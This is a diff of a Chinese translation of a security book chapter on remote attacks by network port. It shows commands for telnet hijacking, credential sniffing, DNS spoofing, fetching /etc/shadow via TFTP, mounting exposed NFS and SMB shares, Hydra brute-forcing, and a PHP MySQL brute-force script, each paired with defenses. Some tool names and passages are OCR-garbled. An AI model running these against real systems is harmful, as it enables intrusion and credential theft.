+假设 IP 地址为 `192.168.1.1` 的主机上的恶意用户与 `192.168.1.2` 处于同一网段。如果 `192.168.1.2` 上的用户建立了到 `10.0.0.1` 的 `telnet` 连接，那么 `192.168.1.1` 上的恶意用户可以使用 `Huntcap` 劫持它：
 
 ```bash
 [bash]# hunt -i eth0
@@ -2840,41 +3099,47 @@ x) exit
 ```
 
 choose conn> 0
+
 dump connection y/n [n] n
+
 输入想要执行的命令字符串或 [cr]> whoami
+
 whoami
+
 jack
+
 输入想要执行的命令字符串或 [cr>
 
-在这种情况下，恶意用户在劫持受害者的 telnet 会话后运行了 `whoami` 命令。所示，命令执行成功，其输出显示了受害者的用户名“jack”。同样，恶意用户也可以发布如下命令：
+在这种情况下，恶意用户在劫持受害者的 `telnet` 会话后运行了 `whoami` 命令。所示，命令执行成功，其输出显示了受害者的用户名“jack”。同样，恶意用户也可以发布如下命令：
 
 ```
 xterm -display 192.168.1.1:0
 ```
 
-这将导致受害者用户“jack”打开的 xterm 窗口返回给恶意用户。当然，恶意用户必须在自己的主机上运行如下的命令：
+这将导致受害者用户“jack”打开的 `xterm` 窗口返回给恶意用户。当然，恶意用户必须在自己的主机上运行如下的命令：
 
 ```
 xhost +192.168.1.32
 ```
 
-以便让在受害者主机上执行的 xterm 实例显示在自己的 X 服务器上。
+以便让在受害者主机上执行的 `xterm` 实例显示在自己的 X 服务器上。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_124_0.png)
 
 # 使用 SSH
 
-禁用 telnet 并改用 SSH（版本 2）等安全替代方案。
+禁用 `telnet` 并改用 `SSH`（版本 2）等安全替代方案。
 
-嗅探：由于 telnet 是明文传输协议，因此可以嗅探到在网络中传输的用户名和密码。许多工具都有助于捕获 telnet 数据和密码。
+嗅探：由于 `telnet` 是明文传输协议，因此可以嗅探到在网络中传输的用户名和密码。许多工具都有助于捕获 `telnet` 数据和密码。
 
 # 嗅探 Telnet 认证
 
-可以使用 ettercap 嗅探 telnet 认证过程中在网络传输传输的用户和密码：
+可以使用 `ettercap` 嗅探 `telnet` 认证过程中在网络传输传输的用户和密码：
 
 ```bash
 [bash]# ettercap -m -C -N
 ```
+
 ettercap 0.6.7 (c) 2002 ALOR & NaGa
 
 您的 IP: 10.0.0.102 MAC 地址: 01:11:04:03:6A:A3 接口: eth0
@@ -2894,19 +3159,21 @@ TCP + UDP 数据包... (默认)
 正在收集密码...
 
 07:04:58 10.0.0.102:4814 --> 192.168.1.1:123 telnet
+
 ```
 USER: john
 PASS: i1ovetln
 ```
+
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_125.png)
 
 # 不要使用 Telnet
 
-不要使用 telnet 这样的明文协议。考虑改用 SSH。
+不要使用 `telnet` 这样的明文协议。考虑改用 `SSH`。
 
-软件漏洞：telnet 守护进程涉及几个可以远程利用的漏洞。下一段描述了一个最容易利用的漏洞之一。
+软件漏洞：`telnet` 守护进程涉及几个可以远程利用的漏洞。下一段描述了一个最容易利用的漏洞之一。
 
-TTYPROMPT 缓冲区溢出漏洞：Solaris 2 自带的 /bin/login 版本存在一个涉及 `TTYPROMPT` 环境变量的漏洞。为了攻击此漏洞，攻击者需要将 `TTYPROMPT` 的值设置为六字符字符串，并在连接后在用户名后发送一个 64 字符的字符串。例如，考虑攻击者尝试通过以下用户登录来利用此漏洞：
+`TTYPROMPT` 缓冲区溢出漏洞：Solaris 2 自带的 `/bin/login` 版本存在一个涉及 `TTYPROMPT` 环境变量的漏洞。为了攻击此漏洞，攻击者需要将 `TTYPROMPT` 的值设置为六字符字符串，并在连接后在用户名后发送一个 64 字符的字符串。例如，考虑攻击者尝试通过以下用户登录来利用此漏洞：
 
 ```
 telnet> TTYPROMPT abdef
@@ -2914,20 +3181,22 @@ telnet -o 192.168.1.10...
 Connected to somecompanyexample.com.
 Escape character is '^'.
 ```
+
 SunOS 5.6
+
 ```
 Last login: Dec 10 12:19:10 from 10.0.0.2 bin@somecompanyexample.com
 ```
 
 # SMTP (简单邮件传输协议): 25 (TCP)
 
-SMTP 是互联网上用于传输电子邮件消息的协议。
+`SMTP` 是互联网上用于传输电子邮件消息的协议。
 
-嗅探：由于 SMTP 是明文协议，因此可以捕获在网络中传输的数据。
+嗅探：由于 `SMTP` 是明文协议，因此可以捕获在网络中传输的数据。
 
 # 嗅探 SMTP 流量
 
-mailcap 程序是嗅探包中的一个工具，可捕获网络上的 SMTP 数据。当 mailcap 监控网络上的 SMTP 数据时，必须在与受害者同一网段的机器上运行。
+`mailcap` 程序是嗅探包中的一个工具，可捕获网络上的 `SMTP` 数据。当 `mailcap` 监控网络上的 `SMTP` 数据时，必须在与受害者同一网段的机器上运行。
 
 ```bash
 [bash] mailcap
@@ -2939,38 +3208,42 @@ Subject: Re: Your email
 Message-ID: Pine.4.4.0302041524510
 MIME-Version: TEXT/PLAIN; charset=US-ASCII
 ```
+
 Hello,
 
 Thanks for your email. The password for your FTP account is 3dd!
+
 Yes I know it is hard to remember, but its your own security.
 
 Thanks,
+
 Joe.
 
 # 加密邮件
 
-GNU Privacy Guard 工具集用于加密电子邮件。鼓励用户加密包含敏感信息的邮件。访问 http://www.gnupg.org/ 获取更多关于 GNU Privacy Guard 的信息。
+`GNU Privacy Guard` 工具集用于加密电子邮件。鼓励用户加密包含敏感信息的邮件。访问 http://www.gnupg.org/ 获取更多关于 `GNU Privacy Guard` 的信息。
 
-软件漏洞：Sendmail 是互联网上最流行的 MTA（邮件传输代理）。Sendmail 已有很多许多受远程利用的漏洞。
+软件漏洞：`Sendmail` 是互联网上最流行的 `MTA`（邮件传输代理）。`Sendmail` 已有很多许多受远程利用的漏洞。
 
-- Sendmail 头部缓冲区溢出漏洞：此漏洞是由 Sendmail 头部解析组件中的缓冲区溢出引起的。具体来说，Sendmail 的 `crackaddr` 未能正确处理邮件头中“From”地址字段中的 `< >` 字符。更多细节请访问 http://www.cert.org/advisories/CA-2003-067.html 和 http://securityfocus.com/bid/6991。
-- Sendmail MIME 漏洞：Sendmail 8.8.3 版本在对电子邮件进行 MIME 转换时由于边界检查不当引入了一个新漏洞。可以通过发送特制的邮件，导致 Sendmail 进程覆盖其内部栈空间，从而远程利用此漏洞。更多信息请见 http://online.securityfocus.com/bid/685。
-- Sendmail HELO 缓冲区溢出：旧版本的 Sendmail 在接收长字符串作为其 HELO 命令的参数时会导致崩溃。可以远程利用此漏洞在 Sendmail 服务器上运行任意命令。更多信息可从 http://www.eyee.com/html/Products/Retina/RTHs/Mail_Servers/141.html 获取。
-- Sendmail DNS Map TXT 记录缓冲区溢出：在 Sendmail 代码的 DNS 处理中发现了一个缓冲区溢出漏洞。该漏洞是由对名称服务器返回的数据边界检查不当引起的。该漏洞会导致缓冲区溢出，可以通过让恶意名称服务器返回任意长度的响应来利用此漏洞在 Sendmail 服务器上运行命令。更多信息可从 http://online.securityfocus.com/bid/5122 获取。
+- `Sendmail` 头部缓冲区溢出漏洞：此漏洞是由 `Sendmail` 头部解析组件中的缓冲区溢出引起的。具体来说，`Sendmail` 的 `crackaddr` 未能正确处理邮件头中“From”地址字段中的 `< >` 字符。更多细节请访问 http://www.cert.org/advisories/CA-2003-067.html 和 http://securityfocus.com/bid/6991。
 
+- `Sendmail` MIME 漏洞：`Sendmail` 8.8.3 版本在对电子邮件进行 MIME 转换时由于边界检查不当引入了一个新漏洞。可以通过发送特制的邮件，导致 `Sendmail` 进程覆盖其内部栈空间，从而远程利用此漏洞。更多信息请见 http://online.securityfocus.com/bid/685。
 
+- `Sendmail` HELO 缓冲区溢出：旧版本的 `Sendmail` 在接收长字符串作为其 `HELO` 命令的参数时会导致崩溃。可以远程利用此漏洞在 `Sendmail` 服务器上运行任意命令。更多信息可从 http://www.eyee.com/html/Products/Retina/RTHs/Mail_Servers/141.html 获取。
 
-
+- `Sendmail` DNS Map TXT 记录缓冲区溢出：在 `Sendmail` 代码的 DNS 处理中发现了一个缓冲区溢出漏洞。该漏洞是由对名称服务器返回的数据边界检查不当引起的。该漏洞会导致缓冲区溢出，可以通过让恶意名称服务器返回任意长度的响应来利用此漏洞在 `Sendmail` 服务器上运行命令。更多信息可从 http://online.securityfocus.com/bid/5122 获取。
 
 # DNS (域名系统): 53 (TCP 和 UDP)
 
-DNS 是一种用于在域名和 IP 地址之间进行翻译的协议。
+`DNS` 是一种用于在域名和 IP 地址之间进行翻译的协议。
+
+
 
 欺骗：与 TCP 不同，UDP 不是一种面向连接的协议。这使得伪造 UDP 流量变得容易。当 DNS 查询 DNS 服务器时，DNS 服务器通过发送一个源自端口 53 的 UDP 包来响应查询。然而，位于同一网络分段或通往 DNS 服务器路径上的恶意用户可以以 DNS 服务器的源 IP 地址向客户端发送响应。如果客户端在收到真实 DNS 服务器的响应之前收恶意响应，则恶意响应将被接受。由于恶意用户可以为客户端伪造欺骗的 DNS 响应，他可能会欺骗客户端连接到自己或其主机，而不是预期的目标。
 
 ### 伪造 DNS 响应
 
-dnsspoof 程序分发于 Dsniff 中，是一个便于伪造 DNS 查询的工具。例如，假设攻击者已经控制了 IP 地址为 10.0.0.1 的网络网关。假设 somecompanyexample.com 的真实 IP 地址为 10.1.1.2。攻击者可以运行 dnsspoof，并使其对所有针对 somecompanyexample.com 的 DNS 查询响应为 192.168.1.1，他或她机器的 IP 地址。
+`dnsspoof` 程序分发于 Dsniff 中，是一个便于伪造 DNS 查询的工具。例如，假设攻击者已经控制了 IP 地址为 10.0.0.1 的网络网关。假设 `somecompanyexample.com` 的真实 IP 地址为 10.1.1.2。攻击者可以运行 `dnsspoof`，并使其对所有针对 `somecompanyexample.com` 的 DNS 查询响应为 192.168.1.1，他或她机器的 IP 地址。
 
 ```
 [gateway]# dnsspoof -i eth0 -f /etc/dnsniff.txt
@@ -2978,11 +3251,11 @@ kernel filter, protocol ALL, raw packet socket
 dnsspoof: listening on eth1 [udp dst port 53 and not src 10.0.0.1]
 ```
 
-攻击者需要确保 /etc/dnsniff.txt 的内容包含以下：
+攻击者需要确保 `/etc/dnsniff.txt` 的内容包含以下：
 
-192.168.1.1 somecompanyexample.com
+`192.168.1.1 somecompanyexample.com`
 
-现在，在尝试识别入侵者时，如果受害者对 somecompanyexample.com 执行 DNS 查询，他或她将被指向黑客机器的 IP 地址 192.168.1.1（而不是 10.1.1.2）：
+现在，在尝试识别入侵者时，如果受害者对 `somecompanyexample.com` 执行 DNS 查询，他或她将被指向黑客机器的 IP 地址 192.168.1.1（而不是 10.1.1.2）：
 
 ```
 [bash]$ host somecompanyexample.com
@@ -2999,7 +3272,7 @@ BIND (Berkeley Internet Name Domain) 是互联网上使用最广泛的 DNS 服�
 
 - BIND NXT 溢出和 DOS 漏洞：该漏洞是由于 BIND 在处理 NXT 记录的输入验证失败引起的。可以通过强制受影响的 DNS 服务器获取精心构造的 NXT 记录来远程利用此漏洞。其他 DOS（拒绝服务）漏洞也位于 http://online.securityfocus.com/bid/788 的 BIND 告告中发布。
 
-考虑使用 djbdns 替代 BIND。djbdns 程序可以在 http://cr.yp.to/djbdns.html 获取。
+考虑使用 `djbdns` 替代 BIND。`djbdns` 程序可以在 http://cr.yp.to/djbdns.html 获取。
 
 # TFTP (简单文件传输协议): 69 (UDP)
 
@@ -3007,9 +3280,9 @@ TFTP 是一种基于 UDP 的协议，用于传输文件。它缺乏认证和目�
 
 嗅探：由于 TFTP 是一种明文协议，可以嗅探正在传输的数据。
 
-# 嗅探 TFTP 数据
+## 嗅探 TFTP 数据
 
-假设用户正在从远程主机 TFTP 传输 /etc/passwd 文件。与用户处于同一分段的恶意用户可以通过运行配置为显示 UDP 流量的 Ettercap 来嗅探受害的数据：
+假设用户正在从远程主机 TFTP 传输 `/etc/passwd` 文件。与用户处于同一分段的恶意用户可以通过运行配置为显示 UDP 流量的 Ettercap 来嗅探受害的数据：
 
 ```
 [shell]# aftercap -N -m -t udp
@@ -3030,7 +3303,8 @@ Press 'h' for help...
 Sniffing (MAC based): ANY --> ANY
 
 UDP packets only...
-# 76 第一部分：攻击技术与防御
+
+## 76 第一部分：攻击技术与防御
 
 ```
 22:49:55 192.168.1.1:33569 --> 10.0.0.1 proto: ./etc/passwd.
@@ -3060,11 +3334,11 @@ ftp:x:14:/home/ftp/.
 
 # TFTP 配置错误
 
-TFTP 服务器经常被错误配置为提供 (root) 目录。这种配置允许远程用户获取 /etc/passwd。
+TFTP 服务器经常被错误配置为提供 (root) 目录。这种配置允许远程用户获取 `/etc/passwd`。
 
 # 获取关键文件
 
-如果远程 TFTP 服务器被错误配置为提供 (root) 目录，可以使用以下 TFTP 命令获取 /etc/shadow：
+如果远程 TFTP 服务器被错误配置为提供 (root) 目录，可以使用以下 TFTP 命令获取 `/etc/shadow`：
 
 ```
 [bash]$ tftp 10.0.0.1 get /etc/shadow
@@ -3072,7 +3346,7 @@ TFTP 服务器经常被错误配置为提供 (root) 目录。这种配置允许�
 
 # 设置 TFTP 根目录
 
-大多数 TFTP 服务器默认提供 /tftp 目录下的文件。该目录可以使用 -s 选项进行设置。详情见 tftpd。
+大多数 TFTP 服务器默认提供 `/tftp` 目录下的文件。该目录可以使用 `-s` 选项进行设置。详情见 `tftpd`。
 
 ### HTTP (超文本传输协议): 80 (TCP)
 
@@ -3088,7 +3362,7 @@ hydra -L usernames.txt -P passwords.txt somecompanyexample.com
 
 # 防止暴力攻击
 
-嗅探：由于 HTTP 是明文协议，网络分段上的恶意用户可以监控另一个用户的 HTTP 流量。URL：urlsnarp 程序与 Dsniff 一起分发，可用于嗅探通过网络发送的 HTTP 请求：
+嗅探：由于 HTTP 是明文协议，网络分段上的恶意用户可以监控另一个用户的 HTTP 流量。URL：`urlsnarp` 程序与 Dsniff 一起分发，可用于嗅探通过网络发送的 HTTP 请求：
 
 ```
 # urlsnarp
@@ -3100,15 +3374,16 @@ GET http://www.mozilla.org/start/HTTP/1.1 - "Mozilla/5.0 (X11); Linux; i686; en-
 10.0.0.1 - [Feb/2023:21:50:42-0800] GET http://c.cirt.net/images/cirt_headline.gif HTTP/1.1 - "http://cirt.net/" "Mozilla/5.0 (X11; Linux; i686; en-US; rv:1.3a) Gecko/200201212
 ```
 
-
-
-
-
 ## 第 4 章：远程攻击 79
 
-vnd.sun.xml.impress.template, application/vnd.sun.xml.draw, application/vnd.stardust.draw, application/x-stardiv, application/vnd.sun.xml.draw.template, application/vnd.sun.xml.math.
+`vnd.sun.xml.impress.template`, `application/vnd.sun.xml.draw`, `application/vnd.stardust.draw`, `application/x-stardiv`, `application/vnd.sun.xml.draw.template`, `application/vnd.sun.xml.math`.
+
+
+
 Accept: application/vnd.stardust.math, application/x-starmarth, audio/midi, image/*, video/*, application/pgp, application-pdf, application/postscript, message/partial, message/external-x-be2, application/android-inset, text/richt.
+
 Accept: text/enriched, x-sun-attachment, application/file, postscript-file, default, main-file, sun-desket-message, application/x-metamail-patch, application/msword, audio/x-pn-reaudio, audio/vnd.rn-reaudio, application/smil, text/vnd-rn-reaudio.
+
 Accept: application/x-shockwave-flash-2-preview, application/sdp, application/x-sdp, application/vnd.rn-realmedia, audio/wav, audio/waw, audio/x-pn-wav, audio/x-pn-windows-ac
 
 ```
@@ -3149,7 +3424,8 @@ Connection: close.
 <BODY>
 <h1>欢迎！</h1>
 </BODY>
-</html```
+</html>
+```
 
 ## 嗅探 HTTP 身份认证
 
@@ -3193,25 +3469,27 @@ http://10.0.0.1/servlet/private/administration
 
 **HTTP 配置错误** 许多情况下，Web 服务器配置错误，或者带有默认配置部署到生产网络。以下段落描述了一些常见的被利用的配置错误。
 
-## 自动索引
+### 自动索引
 
-当开启自动索引时，如果不存在索引文件（如 index.html），Web 服务器将显示目录的内容。
+当开启自动索引时，如果不存在索引文件（如 `index.html`），Web 服务器将显示目录的内容。
 
 通常，Web 内容作者会错误地将包含敏感信息的文件放置在 Web 根目录中，如果显示了目录内容，未身份认证的用户就可以轻松查看这些文件。
 
-## 关闭索引
+### 关闭索引
 
 Apache 用户可以使用 `httpd.conf` 中的 `IndexIgnore` 指令来指示服务器关闭索引。
 
-## 获取源代码、配置、统计数据和密码资源
+### 获取源代码、配置、统计数据和密码资源
 
 许多 HTTP 服务器配置错误，导致关键文件泄露。以下是一些示例：
 
 - CGI 的源代码可能包含数据库的用户名和密码。许多 Web 应用程序使用后缀为 `.inc` 或 `.conf` 的配置文件。此类文件可能包含系统和密码信息，并且经常被配置错误的 Web 服务器提供。
+
 - Web 服务器统计程序将结果输出到 `/stats` 等目录中，这些目录通常放置在 Web 根目录下。
+
 - Apache 允许用户使用 `.htaccess` 文件对目录进行密码保护。通常，攻击者可以下载 `.htpasswd` 文件并离线破解哈希值。
 
-## 不要提供关键资源
+### 不要提供关键资源
 
 Apache 用户可以使用 `httpd.conf` 中的 `<Files>` 指令来防止提供敏感文件。例如：
 
@@ -3222,15 +3500,15 @@ Apache 用户可以使用 `httpd.conf` 中的 `<Files>` 指令来防止提供敏
 </Files>
 ```
 
-## Web 漏洞
+### Web 漏洞
 
-许多 Web 应用程序未能正确清理输入。这会导致各种漏洞，包括 SQL 注入、跨站脚本 (XSS) 和命令注入。开发者对所有来自用户的数据进行验证和清理是非常重要的。
+许多 Web 应用程序未能正确清理输入。这会导致各种漏洞，包括 SQL 注入、跨站脚本 (`XSS`) 和命令注入。开发者对所有来自用户的数据进行验证和清理是非常重要的。
 
-## 防止输入验证
+### 防止输入验证
 
 审计 Web 应用程序以确保对所有用户输入进行验证。需要注意的字符有 `\; \ @ & | % ~ < ]`
 
-## 会话劫持
+### 会话劫持
 
 由于 HTTP 不是状态协议，会话管理由 Web 应用程序提供。在许多情况下，会话通过使用 Cookie 来维护。Cookie 是服务器请求存储在用户硬盘上的信息。
 
@@ -3244,10 +3522,6 @@ lang=en-us; user=joe; time=10:10 EST;
 
 Cookie 并不是维护会话的唯一方法。Web 应用程序可以通过将会话信息嵌入 URL 来维护状态：http://www.somecompanyasexample.com/authenticated.cgi?user=john&sessionid=12345678。
 
-
-
-
-
 # 84 第一部分：攻击技术与防御
 
 ## 预防会话劫持
@@ -3255,7 +3529,9 @@ Cookie 并不是维护会话的唯一方法。Web 应用程序可以通过将会
 以下步骤将帮助防止许多类型的会话劫持技术：
 
 - 为成功身份验证的用户分配随机的会话 ID。
+
 - 考虑在 cookie 中存储加密信息，以便终端用户无法对其进行操纵。
+
 - 使用 SSL 传输所有 cookie 信息。
 
 ## 隐藏的 HTML 元素
@@ -3272,13 +3548,15 @@ Cookie 并不是维护会话的唯一方法。Web 应用程序可以通过将会
 <INPUT NAME="shippingcharges" TYPE=HIDDEN="99">
 ```
 
-在提交修改后的表单后，shippingcharges 字段的值将传递给脆弱的 Web 应用程序。如果 Web 应用程序盲目接受此值，且目标目标是一个电子商务网站，用户的信用卡上可能会产生一笔账单！
+在提交修改后的表单后，`shippingcharges` 字段的值将传递给脆弱的 Web 应用程序。如果 Web 应用程序盲目接受此值，且目标目标是一个电子商务网站，用户的信用卡上可能会产生一笔账单！
 
 ## 不要信任隐藏的 HTML 元素
 
 Web 应用程序开发者不应信任隐藏 HTML 元素的值。进行 Web 应用程序审查以确保不受信任 HTML 元素的值是一个好主意。
 
 ## 源代码注释
+
+
 
 在 Web 应用程序的开发阶段，程序员在 CGI 或 HTML 源代码中放置注释是很常见的。这些注释帮助开发者与同事之间共享细节。源代码注释可能包含关键信息，例如数据库服务器的密码。有时，当 Web 应用程序投入生产时，这些注释会被忽略：
 
@@ -3292,7 +3570,7 @@ John 于 2003/2/12 凌晨 12:15 放置注释
 
 ## 审计源代码注释
 
-定期审计源代码注释是一个好主意。使用 grep 和 wget 等工具在 Web 应用程序源码和 HTML 代码中查找注释。
+定期审计源代码注释是一个好主意。使用 `grep` 和 `wget` 等工具在 Web 应用程序源码和 HTML 代码中查找注释。
 
 ## Web 服务器漏洞
 
@@ -3310,7 +3588,7 @@ POP2 是一种用于从信箱服务器访问电子邮件的协议。
 
 ## 嗅探 POP2 流量
 
-可以使用 Ettercap 等工具嗅探 POP2 数据。当配合 -C 使用时，ettercap 命令会自动过滤并显示跨网络传输的 POP2 用户名和密码。
+可以使用 `Ettercap` 等工具嗅探 POP2 数据。当配合 `-C` 使用时，`ettercap` 命令会自动过滤并显示跨网络传输的 POP2 用户名和密码。
 
 ## 通过 SSH 隧道化 POP2 流量
 
@@ -3328,7 +3606,7 @@ POP3 是一种用于从信箱服务器访问电子邮件的协议。
 
 ## 暴力破解 POP3
 
-可以使用 Hydra 对 POP3 账户进行暴力破解：
+可以使用 `Hydra` 对 POP3 账户进行暴力破解：
 
 ```bash
 [bash]$ hydra -L usernames.txt -P passwords.txt 10.0.0.1 pop3
@@ -3364,6 +3642,7 @@ TCP + UDP packets... (default)
 Collecting passwords...
 
 03:35:26 192.168.1.1:49565 --> 192.168.1.1
+```
 
 ## 通过 SSH 隧道化 POP3 流量
 
@@ -3375,17 +3654,17 @@ ssh -L110:127.0.0.1:110 username@pop3server.somecompanyasanexample.com
 
 ## Portmapper：111 (TCP)
 
-基于 RPC（远程过程调用）的服务如 NIS（网络信息服务）不监听静态端口。这些服务向 Portmapper 注册其端口号。可以使用 rpcinfo 查询 RPC 服务：
+基于 RPC（远程过程调用）的服务如 NIS（网络信息服务）不监听静态端口。这些服务向 Portmapper 注册其端口号。可以使用 `rpcinfo` 查询 RPC 服务：
 
 ## 查询并挂载远程 NFS 共享
 
-使用 showmount 命令查询远程主机的 NFS 共享：
+使用 `showmount` 命令查询远程主机的 NFS 共享：
 
 ```bash
 [bash]$ showmount -e sun1.somecompanyexample.com
 ```
 
-在此示例中，sun1.somecompanyexample.com 配置共享其 /etc 目录。攻击者可以挂载 /etc 目录：
+在此示例中，`sun1.somecompanyexample.com` 配置共享其 `/etc` 目录。攻击者可以挂载 `/etc` 目录：
 
 ```bash
 [bash]$ mount -t NFS sun1.somecompanyexample.com:/etc /mnt/etc
@@ -3393,7 +3672,7 @@ ssh -L110:127.0.0.1:110 username@pop3server.somecompanyasanexample.com
 
 ## 攻击技术与防御
 
-现在，攻击者可以通过以下命令查看 sun1.somecompanyexample.com 的 /etc/passwd 文件：
+现在，攻击者可以通过以下命令查看 `sun1.somecompanyexample.com` 的 `/etc/passwd` 文件：
 
 ```bash
 cat /mnt/etc/passwd
@@ -3405,37 +3684,32 @@ cat /mnt/etc/passwd
 
 - 如果未使用，请考虑关闭 NFS。
 - 配置防火墙阻止 NFS （2049）。
-- 编辑 /etc/exports 以确保没有向未经授权的主机共享。
+- 编辑 `/etc/exports` 以确保没有向未经授权的主机共享。
 
 ## 软件漏洞
 
 RPC 服务容易受到许多导致远程系统入侵的漏洞影响。这些漏洞说明了一些 RPC 服务建议：
 
-- xdr_array 中的缓冲区漏洞：由于 xdr_array() RPC 中的缓冲区漏洞，远程攻击者可以在目标主机上执行任意代码。更多信息见 http://securityfocus.com/bid/5356。
-- xfsdm 中的远程命令执行漏洞：此漏洞影响 SGI IRIX 实现。由于对传递给 RPC 的参数清理不当，可以嵌入元字符“" 和 |”。这些参数被传递给 popen() 函数调用，使攻击者能够在目标机器上执行命令。详情见 http://securityfocus.com/bid/5075。
-- ypasswd 中的缓冲区漏洞：在 ypasswd 的实现中发现了由于边界检查不当导致的缓冲区溢出。可以利用此漏洞以管理员权限在目标机器上执行命令。请参见 http://securityfocus.com/bid/2763。
-- statd 中的远程格式化字符串漏洞：此漏洞影响各种 Linux 发行版中附带的 rpc.stat 程序。由于 rpc.stat 无法对调用 syslog() 函数的用户输入数据进行适当的输入验证，恶意用户可以使用特制的数据在目标主机上执行它。详情请见 http://securityfocus.com/bid/1480。
-
-
-
+- xdr_array 中的缓冲区漏洞：由于 `xdr_array()` RPC 中的缓冲区漏洞，远程攻击者可以在目标主机上执行任意代码。更多信息见 http://securityfocus.com/bid/5356。
+- xfsdm 中的远程命令执行漏洞：此漏洞影响 SGI IRIX 实现。由于对传递给 RPC 的参数清理不当，可以嵌入元字符“" 和 |”。这些参数被传递给 `popen()` 函数调用，使攻击者能够在目标机器上执行命令。详情见 http://securityfocus.com/bid/5075。
+- ypasswd 中的缓冲区漏洞：在 `ypassword` 的实现中发现了由于边界检查不当导致的缓冲区溢出。可以利用此漏洞以管理员权限在目标机器上执行命令。请参见 http://securityfocus.com/bid/2763。
+- statd 中的远程格式化字符串漏洞：此漏洞影响各种 Linux 发行版中附带的 `rpc.stat` 程序。由于 `rpc.stat` 无法对调用 `syslog()` 函数的用户输入数据进行适当的输入验证，恶意用户可以使用特制的数据在目标主机上执行它。详情请见 http://securityfocus.com/bid/1480。
 
 因此，如果你的主机正在运行 RPC 服务，请考虑以下建议：
 
--   许多发行版在安装时会启用各种 RPC 服务。请禁用不需要的 RPC 服务。
-
--   如果不需要 RPC 服务，请禁用 Portmapper 服务。
-
--   配置你的防火墙，不允许远程用户连接到 RPC 服务。
+- 许多发行版在安装时会启用各种 RPC 服务。请禁用不需要的 RPC 服务。
+- 如果不需要 RPC 服务，请禁用 Portmapper 服务。
+- 配置你的防火墙，不允许远程用户连接到 RPC 服务。
 
 ## NNTP (网络新闻传输协议): 119 (TCP)
 
 NNTP 是一种用于分发、查询、检索和发布新闻文章的协议。
 
-暴力破解：许多 NNTP 服务器不需要身份验证。然而，可以使用 Hydra 等暴力破解工具对需要身份验证的 NNTP 服务器进行暴力破解。
+暴力破解：许多 NNTP 服务器不需要身份验证。然而，可以使用 `Hydra` 等暴力破解工具对需要身份验证的 NNTP 服务器进行暴力破解。
 
 ### 暴力破解 NNTP
 
-使用 Hydra 暴力破解 NNTP 账户。以下是操作方法的示例：
+使用 `Hydra` 暴力破解 NNTP 账户。以下是操作方法的示例：
 
 ```
 hydra -L usernames.txt -P passwords.txt 10.0.0.1 nntp
@@ -3449,7 +3723,7 @@ hydra -L usernames.txt -P passwords.txt 10.0.0.1 nntp
 
 ### 嗅探 NNTP 身份验证数据
 
-可以使用 Ettercap 等工具嗅探网络中的 NNTP 流量。以下是使用 Ettercap 捕获 NNTP 身份验证数据的方法：
+可以使用 `Ettercap` 等工具嗅探网络中的 NNTP 流量。以下是使用 `Ettercap` 捕获 NNTP 身份验证数据的方法：
 
 ```
 ettercap -C -N -m
@@ -3463,6 +3737,8 @@ ettercap -C -N -m
 ssh username@remotennptserver.somecompanyasanexample.com -L119:127.0.0.1:119
 ```
 
+
+
 ## Samba: 137 到 139 (TCP)
 
 Samba 使用 SMB（服务器消息）协议在网络上共享文件和打印机。SMB 通常用于 Microsoft Windows 操作系统。有关 Samba 项目的详情请访问 http://www.samba.org/。
@@ -3475,10 +3751,15 @@ Samba 使用 SMB（服务器消息）协议在网络上共享文件和打印机�
 
 ```bash
 $ hydra -L usernames.txt -P passwords.txt 10.0.0.1 smb
+
 Reduced number of tasks to 1 (smb does not like parallel connections)
+
 Hydra v2.2 (c) 2002) by von Hauser / THC - use only for legal purposes.
+
 Hydra is starting! [parallel tasks: 1, login tries: 2 (1:2/p:1)]
+
 [139]smb login: joe password:5h4k33sound
+
 Hydra finished.
 ```
 
@@ -3515,6 +3796,7 @@ Samba 经常配置错误以共享包含关键数据的文件系统。远程用�
 ```bash
 bash]$ smbclient -L smserver -I 192.168.1.10 -U ''
 ```
+
 （注：由于提供的文本包含大量 OCR 错误和重复内容，此处翻译已根据逻辑清理并提取了核心技术步骤）
 
 | 共享名称 | 类型 | 注释 |
@@ -3536,9 +3818,8 @@ mount -t smbfs -o username='' /192.168.1.10/etc /mnt/smbshare
 ### 阻塞和隧道 Samba 流量
 
 如果正在运行 Samba，请考虑以下建议：
-
--   配置你的防火墙阻止 Samba 流量。
--   考虑使用 SSH 对 Samba 流量建立隧道：
+- 配置你的防火墙阻止 Samba 流量。
+- 考虑使用 SSH 对 Samba 流量建立隧道：
 
 ```bash
 ssh username@remotesmbserver.somecompanyasanexample.com -L139:127.0.0.1:139
@@ -3546,7 +3827,7 @@ ssh username@remotesmbserver.somecompanyasanexample.com -L139:127.0.0.1:139
 
 ## IMAP2/IMAP4 (互联网消息访问协议 2/4): 143 (TCP)
 
-IMAP  是一种用于从邮件服务器访问邮件的协议。其功能包括在远程位置存储邮件。
+IMAP 是一种用于从邮件服务器访问邮件的协议。其功能包括在远程位置存储邮件。
 
 IMAP 身份验证容易受到暴力破解。
 
@@ -3556,8 +3837,11 @@ IMAP 身份验证容易受到暴力破解。
 
 ```bash
 hydra -L usernames.txt -P passwords.txt -s 143 192.168.1.1 imap
+
 Hydra v2.2 (c) 2002) by Hauser / THC - use only for legal purposes.
+
 Hydra is starting: [parallel tasks: 4, login tries: 4 (1:1/p:4)] [143] imap login: pardesi password: estd1948!!
+
 Hydra finished.
 ```
 
@@ -3566,9 +3850,6 @@ Hydra finished.
 请参见“针对暴力攻击的常见防御措施”。
 
 嗅探：由于 NNTP 是明文协议，因此可以嗅探网络中传输的 NNTP 数据。
-
-
-
 
 命令行工具 `openssl` 可用于连接到 IMAPS 服务器：
 
@@ -3608,11 +3889,15 @@ MySQL 是一个流行的开源数据库软件包。它可以在 http://www.mysql
 
 ```php
 <?
+
 /*Author: Nitesh Dhanjani [ hacknotes@dhanjani.com ]
+
 此脚本尝试对 MySQL 服务器进行暴力破解。请确保 $username 和 $password 设置为包含用户名和密码的文件名以便进行尝试。*/
 
 $username="usernames.txt";
+
 $password="passwords.txt";
+
 if($argc != 2) 
 {
     print "Usage: argv[0] hostname\n";
@@ -3649,9 +3934,13 @@ print("DONE\n");
 
 ```bash
 [bash]$php -f mssqlite.php mssql.somecompanyanexample.com
+
 SUCCESS!: root, sqlMy455!
+
 DONE
 ```
+
+
 
 PHP 编程语言解释器可以在 http://www.php.net/ 下载。
 
@@ -3663,11 +3952,11 @@ MySQL 嗅探使用明文协议在客户端和服务器之间建立连接。因�
 
 # 嗅探 MySQL 流量
 
